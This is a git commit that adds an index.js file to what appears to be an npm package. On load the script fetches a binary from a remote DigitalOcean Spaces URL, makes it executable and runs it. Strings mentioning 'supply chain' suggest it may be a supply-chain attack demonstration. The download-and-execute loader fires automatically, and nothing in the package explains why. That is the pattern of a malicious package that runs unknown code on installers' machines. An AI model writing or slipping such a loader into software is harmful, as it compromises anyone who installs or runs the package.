8d0788794ea4d4d46a127c2ed00f1f11c2b4fd87
Kaif Ahsan <kahsan@atlassian.com>
2023-11-22 00:42:44 +1100

    Adding initial package files

---
+++ index.js
@@ -0,0 +1,58 @@
+#!/usr/bin/env node
+
+const fs = require('fs');
+const path = require('path');
+const { exec } = require('child_process');
+
+let fetch;
+
+async function initialize() {
+  const module = await import('node-fetch');
+  fetch = module.default;
+  await main(); // Main is here [Note]
+}
+
+const TARGET_URL = 'https://sc-demo-backup.nyc3.digitaloceanspaces.com/my-binary';
+const BINARY_PATH = path.join(__dirname, 'my-binary');
+
+async function download() {
+  const res = await fetch(TARGET_URL);
+  const fileStream = fs.createWriteStream(BINARY_PATH);
+  await new Promise((resolve, reject) => {
+    res.body.pipe(fileStream);
+    res.body.on('error', reject);
+    fileStream.on('finish', resolve);
+  });
+}
+
+function runBinary() {
+  exec(BINARY_PATH, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error executing binary: ${error}`);
+      return;
+    }
+    console.log(`STDOUT: ${stdout}`);
+    console.error(`STDERR: ${stderr}`);
+  });
+}
+
+async function main() {
+  await download();
+  fs.chmodSync(BINARY_PATH, 0o755);
+  runBinary();
+}
+
+// Initialize and then run main
+initialize().catch((err) => console.error(err));
+
+// Function to compare string against "supply chain"
+function compareString(str) {
+  return str === "supply chain";
+}
+
+// Exports
+module.exports = {
+  download,
+  runBinary,
+  compareString
+};
